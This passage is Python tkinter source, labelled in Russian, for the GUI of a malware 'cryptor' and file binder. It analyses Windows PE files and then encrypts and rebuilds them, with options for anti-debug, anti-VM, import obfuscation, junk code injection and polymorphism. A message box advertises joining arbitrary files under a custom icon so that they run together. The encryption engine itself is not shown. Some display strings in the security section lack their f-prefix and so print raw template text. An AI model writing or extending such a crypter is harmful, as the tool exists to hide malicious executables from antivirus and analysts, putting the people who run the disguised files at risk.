                ("Dynamic libraries", "*.dll"),
                ("All files", "*.*")
            ]
        )
        
        if file_path:
            self.file_path_var.set(file_path)
            self.current_file = file_path
            self.log_message(f"Выбран файл: {file_path}")
            
    def analyze_file(self):
        """Анализ файла"""
        if not self.current_file:
            messagebox.showwarning("Предупреждение", "Сначала выберите файл!")
            return
        
        # Запуск анализа в отдельном потоке
        self.analyze_button.configure(state="disabled", text="Анализирую...")
        self.status_bar.configure(text="Анализирую файл...")
        
        thread = threading.Thread(target=self._analyze_file_thread)
        thread.daemon = True
        thread.start()
        
    def _analyze_file_thread(self):
        """Поток анализа файла"""
        try:
            self.log_message("Начинаю анализ файла...")
            
            # Анализ файла
            self.analysis_result = self.file_analyzer.analyze_file(self.current_file)
            
            if "error" in self.analysis_result:
                self.log_message(f"Ошибка анализа: {self.analysis_result['error']}")
                return
            
            # Обновление GUI в главном потоке
            self.root.after(0, self._update_analysis_display)
            
        except Exception as e:
            self.log_message(f"Ошибка анализа: {e}")
        finally:
            self.root.after(0, self._finish_analysis)
    
    def _update_analysis_display(self):
        """Обновление отображения результатов анализа"""
        if not self.analysis_result:
            return
        
        # Общая информация
        general_info = self._format_general_info()
        self.general_text.delete(1.0, tk.END)
        self.general_text.insert(1.0, general_info)
        
        # PE информация
        pe_info = self._format_pe_info()
        self.pe_text.delete(1.0, tk.END)
        self.pe_text.insert(1.0, pe_info)
        
        # Зависимости
        deps_info = self._format_dependencies()
        self.deps_text.delete(1.0, tk.END)
        self.deps_text.insert(1.0, deps_info)
        
        # Секции
        sections_info = self._format_sections()
        self.sections_text.delete(1.0, tk.END)
        self.sections_text.insert(1.0, sections_info)
        
        # Безопасность
        security_info = self._format_security()
        self.security_text.delete(1.0, tk.END)
        self.security_text.insert(1.0, security_info)
        
    def _format_general_info(self) -> str:
        """Форматирование общей информации"""
        if not self.analysis_result or "file_info" not in self.analysis_result:
            return "Информация недоступна"
        
        file_info = self.analysis_result["file_info"]
        
        # Определяем тип приложения
        app_type = "Native"
        if self.analysis_result.get('is_dotnet', False):
            app_type = ".NET"
        
        info = f"""
╔══════════════════════════════════════════════════════════════╗
║                    ОБЩАЯ ИНФОРМАЦИЯ О ФАЙЛЕ                 ║
╚══════════════════════════════════════════════════════════════╝

{'='*60}
{'='*15} 🟢 {app_type} 🟢 {'='*15}
{'='*60}

📁 Имя файла: {file_info.get('name', 'N/A')}
📍 Путь: {file_info.get('path', 'N/A')}
📏 Размер: {file_info.get('size', 0):,} байт ({self._format_size(file_info.get('size', 0))})
🕒 Создан: {self._format_timestamp(file_info.get('created', 0))}
🕒 Изменен: {self._format_timestamp(file_info.get('modified', 0))}
🕒 Доступ: {self._format_timestamp(file_info.get('accessed', 0))}

🔐 Хеши:
   MD5:    {file_info.get('hash_md5', 'N/A')}
   SHA256: {file_info.get('hash_sha256', 'N/A')}

📋 Тип файла: {file_info.get('file_type', 'N/A')}
🎯 MIME тип: {file_info.get('mime_type', 'N/A')}
⚙️ Исполняемый: {'Да' if file_info.get('is_executable', False) else 'Нет'}
🛡️ Системный: {'Да' if file_info.get('is_system_file', False) else 'Нет'}

🏗️ Архитектура: {self.analysis_result.get('architecture', 'N/A')}
⚠️ Уровень угрозы: {self.analysis_result.get('threat_level', 'UNKNOWN')}
"""
        
        return info
    
    def _format_pe_info(self) -> str:
        """Форматирование PE информации"""
        if not self.analysis_result or "pe_info" not in self.analysis_result:
            return "PE информация недоступна"
        
        pe_info = self.analysis_result["pe_info"]
        
        info = f"""
╔══════════════════════════════════════════════════════════════╗
║                      PE ИНФОРМАЦИЯ                           ║
╚══════════════════════════════════════════════════════════════╝

🖥️ Машина: {pe_info.get('machine_name', 'N/A')} ({pe_info.get('machine', 'N/A')})
⚙️ Характеристики: {pe_info.get('characteristics', 'N/A')}
🎯 Подсистема: {pe_info.get('subsystem', 'N/A')}
🛡️ DLL характеристики: {pe_info.get('dll_characteristics', 'N/A')}

📍 Базовый адрес: {pe_info.get('image_base', 'N/A')}
🎯 Точка входа: {pe_info.get('entry_point', 'N/A')}
📏 Размер образа: {pe_info.get('size_of_image', 0):,} байт
📏 Размер заголовков: {pe_info.get('size_of_headers', 0):,} байт
🔍 Контрольная сумма: {pe_info.get('checksum', 'N/A')}
🕒 Временная метка: {self._format_timestamp(pe_info.get('timestamp', 0))}

📊 Секции: {pe_info.get('number_of_sections', 0)}
🔍 Символы: {pe_info.get('number_of_symbols', 0)}

📋 Типы файлов:
   DLL: {'Да' if pe_info.get('is_dll', False) else 'Нет'}
   EXE: {'Да' if pe_info.get('is_exe', False) else 'Нет'}
   Driver: {'Да' if pe_info.get('is_driver', False) else 'Нет'}

🔧 Возможности:
   Релокации: {'Да' if pe_info.get('has_relocations', False) else 'Нет'}
   Отладка: {'Да' if pe_info.get('has_debug', False) else 'Нет'}
   TLS: {'Да' if pe_info.get('has_tls', False) else 'Нет'}
   Ресурсы: {'Да' if pe_info.get('has_resources', False) else 'Нет'}
   Экспорты: {'Да' if pe_info.get('has_exports', False) else 'Нет'}
   Импорты: {'Да' if pe_info.get('has_imports', False) else 'Нет'}
"""
        
        return info
    
    def _format_dependencies(self) -> str:
        """Форматирование зависимостей"""
        if not self.analysis_result or "dependencies" not in self.analysis_result:
            return "Зависимости недоступны"
        
        deps = self.analysis_result["dependencies"]
        
        info = "╔══════════════════════════════════════════════════════════════╗\n"
        info += "║                      ЗАВИСИМОСТИ                            ║\n"
        info += "╚══════════════════════════════════════════════════════════════╝\n\n"
        
        if not deps:
            info += "Зависимости не найдены\n"
        else:
            for i, dep in enumerate(deps, 1):
                if "error" in dep:
                    info += f"❌ Ошибка: {dep['error']}\n"
                    continue
                
                info += f"📦 {i}. {dep.get('dll_name', 'N/A')}\n"
                functions = dep.get('functions', [])
                if functions:
                    for func in functions[:10]:  # Показываем первые 10 функций
                        info += f"   └─ {func.get('name', 'N/A')} @ {func.get('address', 'N/A')}\n"
                    if len(functions) > 10:
                        info += f"   └─ ... и еще {len(functions) - 10} функций\n"
                info += "\n"
        
        return info
    
    def _format_sections(self) -> str:
        """Форматирование секций"""
        if not self.analysis_result or "sections" not in self.analysis_result:
            return "Секции недоступны"
        
        sections = self.analysis_result["sections"]
        
        info = "╔══════════════════════════════════════════════════════════════╗\n"
        info += "║                        СЕКЦИИ                               ║\n"
        info += "╚══════════════════════════════════════════════════════════════╝\n\n"
        
        if not sections:
            info += "Секции не найдены\n"
        else:
            for i, section in enumerate(sections, 1):
                if "error" in section:
                    info += f"❌ Ошибка: {section['error']}\n"
                    continue
                
                info += f"📄 {i}. {section.get('name', 'N/A')}\n"
                info += f"   📍 Виртуальный адрес: {section.get('virtual_address', 'N/A')}\n"
                info += f"   📏 Виртуальный размер: {section.get('virtual_size', 0):,} байт\n"
                info += f"   📍 Raw адрес: {section.get('raw_address', 'N/A')}\n"
                info += f"   📏 Raw размер: {section.get('raw_size', 0):,} байт\n"
                info += f"   🔧 Характеристики: {section.get('characteristics', 'N/A')}\n"
                entropy_value = section.get('entropy', 0)
                if isinstance(entropy_value, (int, float)):
                    info += f"   📊 Энтропия: {entropy_value:.2f}\n"
                else:
                    info += f"   📊 Энтропия: {entropy_value}\n"
                info += f"   ⚙️ Исполняемая: {'Да' if section.get('is_executable', False) else 'Нет'}\n"
                info += f"   📖 Читаемая: {'Да' if section.get('is_readable', False) else 'Нет'}\n"
                info += f"   ✏️ Записываемая: {'Да' if section.get('is_writable', False) else 'Нет'}\n\n"
        
        return info
    
    def _format_security(self) -> str:
        """Форматирование информации о безопасности"""
        if not self.analysis_result or "security" not in self.analysis_result:
            return "Информация о безопасности недоступна"
        
        security = self.analysis_result["security"]
        entropy = self.analysis_result.get("entropy", {})
        
        info = "╔══════════════════════════════════════════════════════════════╗\n"
        info += "║                      БЕЗОПАСНОСТЬ                           ║\n"
        info += "╚══════════════════════════════════════════════════════════════╝\n\n"
        
        info += "🔐 Цифровая подпись: {'Да' if security.get('has_signature', False) else 'Нет'}\n"
        info += "🛡️ ASLR: {'Включен' if security.get('aslr_enabled', False) else 'Отключен'}\n"
        info += "🛡️ DEP: {'Включен' if security.get('dep_enabled', False) else 'Отключен'}\n"
        info += "🛡️ CFG: {'Включен' if security.get('cfg_enabled', False) else 'Отключен'}\n"
        info += "🛡️ High Entropy VA: {'Да' if security.get('high_entropy_va', False) else 'Нет'}\n\n"
        
        info += "📊 ЭНТРОПИЯ:\n"
        if entropy:
            overall_entropy = entropy.get("overall", 0)
            if isinstance(overall_entropy, (int, float)):
                info += f"   Общая: {overall_entropy:.2f}\n"
            else:
                info += f"   Общая: {overall_entropy}\n"
            
            for section_name, section_entropy in entropy.items():
                if section_name != "overall":
                    if isinstance(section_entropy, (int, float)):
                        info += f"   {section_name}: {section_entropy:.2f}\n"
                    else:
                        info += f"   {section_name}: {section_entropy}\n"
        else:
            info += "   Недоступна\n"
        
        return info
    
    def _finish_analysis(self):
        """Завершение анализа"""
        self.analyze_button.configure(state="normal", text="🔍 Анализировать файл")
        # Обновляем статусную строку с информацией о типе приложения
        if self.analysis_result:
            app_type = "Native"
            if self.analysis_result.get('is_dotnet', False):
                app_type = ".NET"
            self.status_bar.configure(text=f"Анализ завершен | Тип: {app_type}")
        else:
            self.status_bar.configure(text="Анализ завершен")
        # Добавляем информацию о типе приложения в лог
        if self.analysis_result:
            app_type = "Native"
            if self.analysis_result.get('is_dotnet', False):
                app_type = ".NET"
            self.log_message(f"🎯 Тип приложения: {app_type}")
            if self.analysis_result.get('is_dotnet', False):
                self.log_message("✅ .NET поддержка: Включена")
            else:
                self.log_message("✅ Native поддержка: Включена")
        self.log_message("Анализ файла завершен")

    def start_crypting(self):
        """Начало криптования"""
        if not self.current_file:
            messagebox.showwarning("Предупреждение", "Сначала выберите файл!")
            return

        if not self.analysis_result:
            messagebox.showwarning("Предупреждение", "Сначала проанализируйте файл!")
            return

        # Сбор настроек
        options = self._collect_options()

        # Запуск криптования в отдельном потоке
        self.crypt_button.configure(state="disabled", text="Криптую...")
        self.status_bar.configure(text="Криптую файл...")

        thread = threading.Thread(target=self._crypt_file_thread, args=(options,))
        thread.daemon = True
        thread.start()
        
    def _crypt_file_thread(self, options: Dict):
        """Поток криптования файла"""
        try:
            self.log_message("Начинаю криптование файла...")
            self.log_message(f"🎯 Режим стаба: {options.get('stub_mode', 'DEFAULT')}")
            self.log_message(f"Алгоритм: {options.get('encryption_algorithm', 'AES-256-GCM')}")
            self.log_message(f"Обфускация: {options.get('obfuscation_level', 'MAXIMUM')}")

            # Логируем все настройки для отладки
            self.log_message(f"🔧 Все настройки: {options}")
            
            # Используем функцию encrypt_and_build которая создает валидный исполняемый файл
            result = self.cryptor_engine.encrypt_and_build(self.current_file, options)

            if result.get("success", False):
                self.log_message("✅ Криптование завершено успешно!")
                self.log_message(f"📁 Выходной файл: {result.get('output_file', 'N/A')}")
                self.log_message(f"📏 Размер: {result.get('payload_size', 0):,} байт")
                self.log_message(f"🔑 AES-ключ: {result.get('aes_key', 'N/A')}")
                self.log_message(f"🛠️ Loader: {result.get('loader_exe', 'N/A')}")
                self.log_message(f"Архитектура: {result.get('arch', 'N/A')}, .NET: {result.get('is_dotnet', False)}")
                self.root.after(0, lambda: messagebox.showinfo(
                    "Успех", 
                    f"Файл успешно зашифрован!\n\n"
                    f"Режим: {options.get('stub_mode', 'DEFAULT')}\n"
                    f"Выходной файл: {result.get('output_file', 'N/A')}\n"
                    f"Размер: {result.get('payload_size', 0):,} байт\n"
                    f"AES-ключ: {result.get('aes_key', 'N/A')}\n"
                    f"Loader: {result.get('loader_exe', 'N/A')}\n"
                    f"Архитектура: {result.get('arch', 'N/A')}, .NET: {result.get('is_dotnet', False)}"
                ))
            else:
                self.log_message(f"❌ Ошибка криптования: {result.get('error', 'Неизвестная ошибка')}")
        except Exception as e:
            self.log_message(f"❌ Ошибка криптования: {e}")
        finally:
            self.root.after(0, self._finish_crypting)
    
    def _collect_options(self) -> Dict:
        """Сбор настроек криптора"""
        return {
            "stub_mode": self.stub_mode_var.get(),
            "encryption_algorithm": self.encryption_var.get(),
            "obfuscation_level": self.obfuscation_var.get(),
            "string_encryption": self.string_encryption_var.get(),
            "import_obfuscation": self.import_obfuscation_var.get(),
            "junk_code_injection": self.junk_code_var.get(),
            "anti_debug": self.anti_debug_var.get(),
            "anti_vm": self.anti_vm_var.get(),
            "timing_analysis": self.timing_analysis_var.get(),
            "polymorphic": self.polymorphic_var.get(),
            "anti_analysis": True
        }
    
    def _finish_crypting(self):
        """Завершение криптования"""
        self.crypt_button.configure(state="normal", text="🚀 Начать криптование")
        self.status_bar.configure(text="Готов к работе")
        
    def log_message(self, message: str):
        """Добавление сообщения в лог с цветовой разметкой"""
        timestamp = time.strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        # Определяем тип сообщения и цвет
        if "✅" in message or "успешно" in message.lower():
            tag = "success"
        elif "❌" in message or "ошибка" in message.lower() or "error" in message.lower():
            tag = "error"
        elif "⚠️" in message or "предупреждение" in message.lower() or "warning" in message.lower():
            tag = "warning"
        elif "[DEBUG]" in message:
            tag = "debug"
        elif "🔧" in message or "🎯" in message or "📊" in message:
            tag = "info"
        else:
            tag = "success"  # По умолчанию зеленый
        
        # Вставляем сообщение с цветом
        self.log_text.insert(tk.END, log_entry, tag)
        self.log_text.see(tk.END)
    
    def clear_logs(self):
        """Очистка логов"""
        self.log_text.delete(1.0, tk.END)
        self.log_message("🗑️ Логи очищены")
    
    def save_logs(self):
        """Сохранение логов в файл"""
        try:
            from tkinter import filedialog
            file_path = filedialog.asksaveasfilename(
                title="Сохранить логи",
                defaultextension=".txt",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
            
            if file_path:
                logs_content = self.log_text.get(1.0, tk.END)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(logs_content)
                self.log_message(f"💾 Логи сохранены в: {file_path}")
        except Exception as e:
            self.log_message(f"❌ Ошибка сохранения логов: {e}")
        
    def _format_size(self, size_bytes: int) -> str:
        """Форматирование размера файла"""
        if size_bytes == 0:
            return "0 B"
        
        size_names = ["B", "KB", "MB", "GB"]
        i = 0
        while size_bytes >= 1024 and i < len(size_names) - 1:
            size_bytes /= 1024.0
            i += 1
        
        return f"{size_bytes:.1f} {size_names[i]}"
    
    def _format_timestamp(self, timestamp: float) -> str:
        """Форматирование временной метки"""
        try:
            if timestamp > 0:
                dt = datetime.fromtimestamp(timestamp)
                return dt.strftime("%Y-%m-%d %H:%M:%S")
            else:
                return "N/A"
        except:
            return "N/A"
    
    def show_binder_info(self):
        """Показать информацию о Binder"""
        messagebox.showinfo(
            "📎 File Binder", 
            "Функция склейки файлов полностью реализована!\n\n"
            "Возможности:\n"
            "• Склейка файлов любого типа\n"
            "• Установка иконки для результата\n"
            "• Совместный запуск всех файлов\n"
            "• Настройка порядка выполнения\n"
            "• Параллельный и последовательный режимы\n\n"
            "Откройте вкладку '📎 Binder' для использования!"
        ) 